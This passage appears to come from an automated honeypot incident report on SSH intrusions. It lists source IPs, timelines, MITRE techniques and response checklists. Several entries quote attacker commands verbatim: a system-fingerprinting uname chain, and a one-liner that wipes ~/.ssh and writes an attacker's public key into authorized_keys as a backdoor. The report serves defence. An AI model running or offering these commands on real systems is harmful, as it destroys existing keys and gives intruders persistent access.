| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:14:42` | `cowrie.session.connect` |
| `2026-08-23 19:14:42` | `cowrie.client.version` |
| `2026-08-23 19:14:42` | `cowrie.client.kex` |
| `2026-08-23 19:14:43` | `cowrie.login.success` |
| `2026-08-23 19:14:44` | `cowrie.session.params` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.success` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.command.input` |
| `2026-08-23 19:14:44` | `cowrie.log.closed` |
| `2026-08-23 19:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8def615d9b83

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-08-23 19:16 |
| **Last Seen** | 2026-08-23 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:16:36` | `cowrie.session.connect` |
| `2026-08-23 19:16:37` | `cowrie.client.version` |
| `2026-08-23 19:16:37` | `cowrie.client.kex` |
| `2026-08-23 19:16:39` | `cowrie.login.success` |
| `2026-08-23 19:16:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863bfa250718

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:16 |
| **Last Seen** | 2026-08-23 19:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:16:40` | `cowrie.session.connect` |
| `2026-08-23 19:16:40` | `cowrie.client.version` |
| `2026-08-23 19:16:40` | `cowrie.client.kex` |
| `2026-08-23 19:16:41` | `cowrie.login.success` |
| `2026-08-23 19:16:42` | `cowrie.session.params` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.success` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.command.input` |
| `2026-08-23 19:16:42` | `cowrie.log.closed` |
| `2026-08-23 19:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f8e41d1f71

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]179` |
| **First Seen** | 2026-08-23 19:16 |
| **Last Seen** | 2026-08-23 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:16:49` | `cowrie.session.connect` |
| `2026-08-23 19:16:49` | `cowrie.client.version` |
| `2026-08-23 19:16:49` | `cowrie.client.kex` |
| `2026-08-23 19:16:51` | `cowrie.login.success` |
| `2026-08-23 19:16:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]179` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88988bcc895

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-08-23 19:16 |
| **Last Seen** | 2026-08-23 19:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:16:57` | `cowrie.session.connect` |
| `2026-08-23 19:16:58` | `cowrie.client.version` |
| `2026-08-23 19:16:58` | `cowrie.client.kex` |
| `2026-08-23 19:17:00` | `cowrie.login.success` |
| `2026-08-23 19:17:00` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b28552fb4c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:18 |
| **Last Seen** | 2026-08-23 19:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:18:33` | `cowrie.session.connect` |
| `2026-08-23 19:18:33` | `cowrie.client.version` |
| `2026-08-23 19:18:33` | `cowrie.client.kex` |
| `2026-08-23 19:18:34` | `cowrie.login.success` |
| `2026-08-23 19:18:35` | `cowrie.session.params` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.success` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:35` | `cowrie.command.input` |
| `2026-08-23 19:18:36` | `cowrie.log.closed` |
| `2026-08-23 19:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a37988404f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:19 |
| **Last Seen** | 2026-08-23 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:19:39` | `cowrie.session.connect` |
| `2026-08-23 19:19:39` | `cowrie.client.version` |
| `2026-08-23 19:19:39` | `cowrie.client.kex` |
| `2026-08-23 19:19:40` | `cowrie.login.success` |
| `2026-08-23 19:19:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:19:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:19:40` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aaa55769a0b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:19 |
| **Last Seen** | 2026-08-23 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:19:43` | `cowrie.session.connect` |
| `2026-08-23 19:19:43` | `cowrie.client.version` |
| `2026-08-23 19:19:43` | `cowrie.client.kex` |
| `2026-08-23 19:19:44` | `cowrie.login.success` |
| `2026-08-23 19:19:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:19:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:19:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b49d52230b

| Field | Detail |
|---|---|
| **Source IP** | `49.124.132[.]6` |
| **First Seen** | 2026-08-23 19:20 |
| **Last Seen** | 2026-08-23 19:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:20:05` | `cowrie.session.connect` |
| `2026-08-23 19:20:05` | `cowrie.client.version` |
| `2026-08-23 19:20:05` | `cowrie.client.kex` |
| `2026-08-23 19:20:08` | `cowrie.login.success` |
| `2026-08-23 19:20:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.132[.]6` to AbuseIPDB if not already reported
- [ ] Block `49.124.132[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57db630faac5

| Field | Detail |
|---|---|
| **Source IP** | `27.39.130[.]144` |
| **First Seen** | 2026-08-23 19:20 |
| **Last Seen** | 2026-08-23 19:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:20:14` | `cowrie.session.connect` |
| `2026-08-23 19:20:14` | `cowrie.client.version` |
| `2026-08-23 19:20:14` | `cowrie.client.kex` |
| `2026-08-23 19:20:16` | `cowrie.login.success` |
| `2026-08-23 19:20:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.39.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.39.130[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed599d9f5c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:20 |
| **Last Seen** | 2026-08-23 19:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:20:38` | `cowrie.session.connect` |
| `2026-08-23 19:20:38` | `cowrie.client.version` |
| `2026-08-23 19:20:38` | `cowrie.client.kex` |
| `2026-08-23 19:20:39` | `cowrie.login.success` |
| `2026-08-23 19:20:40` | `cowrie.session.params` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.success` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.command.input` |
| `2026-08-23 19:20:40` | `cowrie.log.closed` |
| `2026-08-23 19:20:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629d065a6307

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:22 |
| **Last Seen** | 2026-08-23 19:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:22:25` | `cowrie.session.connect` |
| `2026-08-23 19:22:25` | `cowrie.client.version` |
| `2026-08-23 19:22:25` | `cowrie.client.kex` |
| `2026-08-23 19:22:26` | `cowrie.login.success` |
| `2026-08-23 19:22:28` | `cowrie.session.params` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.success` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.command.input` |
| `2026-08-23 19:22:28` | `cowrie.log.closed` |
| `2026-08-23 19:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e53d9d6416

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:24 |
| **Last Seen** | 2026-08-23 19:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:24:10` | `cowrie.session.connect` |
| `2026-08-23 19:24:10` | `cowrie.client.version` |
| `2026-08-23 19:24:10` | `cowrie.client.kex` |
| `2026-08-23 19:24:11` | `cowrie.login.success` |
| `2026-08-23 19:24:12` | `cowrie.session.params` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.success` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:12` | `cowrie.command.input` |
| `2026-08-23 19:24:13` | `cowrie.log.closed` |
| `2026-08-23 19:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d471b748e0b

| Field | Detail |
|---|---|
| **Source IP** | `118.145.237[.]236` |
| **First Seen** | 2026-08-23 19:25 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:25:13` | `cowrie.session.connect` |
| `2026-08-23 19:25:14` | `cowrie.client.version` |
| `2026-08-23 19:25:14` | `cowrie.client.kex` |
| `2026-08-23 19:25:15` | `cowrie.login.success` |
| `2026-08-23 19:25:16` | `cowrie.session.params` |
| `2026-08-23 19:25:16` | `cowrie.command.input` |
| `2026-08-23 19:25:16` | `cowrie.command.failed` |
| `2026-08-23 19:25:17` | `cowrie.log.closed` |
| `2026-08-23 19:25:18` | `cowrie.session.params` |
| `2026-08-23 19:25:18` | `cowrie.command.input` |
| `2026-08-23 19:25:18` | `cowrie.session.file_download` |
| `2026-08-23 19:25:18` | `cowrie.log.closed` |
| `2026-08-23 19:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.237[.]236` to AbuseIPDB if not already reported
- [ ] Block `118.145.237[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc5bed3f650

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:26 |
| **Last Seen** | 2026-08-23 19:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:26:01` | `cowrie.session.connect` |
| `2026-08-23 19:26:01` | `cowrie.client.version` |
| `2026-08-23 19:26:01` | `cowrie.client.kex` |
| `2026-08-23 19:26:01` | `cowrie.login.success` |
| `2026-08-23 19:26:02` | `cowrie.session.params` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.success` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:02` | `cowrie.command.input` |
| `2026-08-23 19:26:03` | `cowrie.log.closed` |
| `2026-08-23 19:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d1f4b5fae4

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
| **First Seen** | 2026-08-23 19:27 |
| **Last Seen** | 2026-08-23 19:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:27:12` | `cowrie.session.connect` |
| `2026-08-23 19:27:12` | `cowrie.client.version` |
| `2026-08-23 19:27:12` | `cowrie.client.kex` |
| `2026-08-23 19:27:13` | `cowrie.login.success` |
| `2026-08-23 19:27:14` | `cowrie.session.params` |
| `2026-08-23 19:27:14` | `cowrie.command.input` |
| `2026-08-23 19:27:14` | `cowrie.command.failed` |
| `2026-08-23 19:27:14` | `cowrie.log.closed` |
| `2026-08-23 19:27:15` | `cowrie.session.params` |
| `2026-08-23 19:27:15` | `cowrie.command.input` |
| `2026-08-23 19:27:16` | `cowrie.session.file_download` |
| `2026-08-23 19:27:16` | `cowrie.log.closed` |
| `2026-08-23 19:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac045706944

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
